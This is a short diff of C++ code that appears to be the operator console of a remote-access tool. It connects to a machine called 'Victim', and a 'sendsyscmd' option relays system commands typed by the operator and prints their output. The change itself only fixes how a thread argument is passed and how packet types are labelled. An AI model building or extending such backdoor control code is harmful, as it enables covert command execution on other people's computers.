@@ -94,7 +94,7 @@ int main(int argc, char** argv)
 
 			Victim.Init(ip, port);
 			Victim.Connect();
-			recvThread = thread(recvLoop, Victim, vicName);
+			recvThread = thread(recvLoop, &Victim, vicName);
 		}
 		else if (input == "disconnect" || input == "Disconnect") {
 			Victim.DisConnect();
@@ -119,7 +119,7 @@ int main(int argc, char** argv)
 		}else if (input == "sendsyscmd" || input == "SendSysCmd") {
 			UFuncts::printfC("Enter Command: ", 5, 0, 0, 0);
 			getline(cin, input);
-			Victim.SendDataT<string>("CMD");
+			Victim.SendDataT<Packets>(P_CMD);
 			Victim.SendDataT<string>(input);
 			UFuncts::printfC("Returned:", 6, 0, 0, 0);
 			printf("\n");
